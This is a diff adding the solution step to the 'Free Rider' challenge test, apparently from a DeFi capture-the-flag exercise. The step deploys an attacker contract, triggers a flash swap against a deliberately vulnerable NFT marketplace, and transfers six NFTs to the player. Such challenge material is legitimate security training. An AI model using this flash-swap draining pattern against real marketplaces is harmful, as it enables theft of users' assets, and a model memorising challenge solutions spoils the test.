@@ -126,6 +126,20 @@ describe("[Challenge] Free Rider", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    const FreeRider = await ethers.getContractFactory("FreeRider");
+    const freeRider = await FreeRider.deploy(
+      uniswapPair.address,
+      marketplace.address,
+      devsContract.address,
+      weth.address,
+      nft.address,
+      player.address,
+      { value: ethers.utils.parseEther("0.05") }
+    );
+    await freeRider.flashSwap();
+    for (i = 0; i < 6; i++) {
+      await freeRider.connect(player).transferNft(i);
+    }
   });
 
   after(async function () {
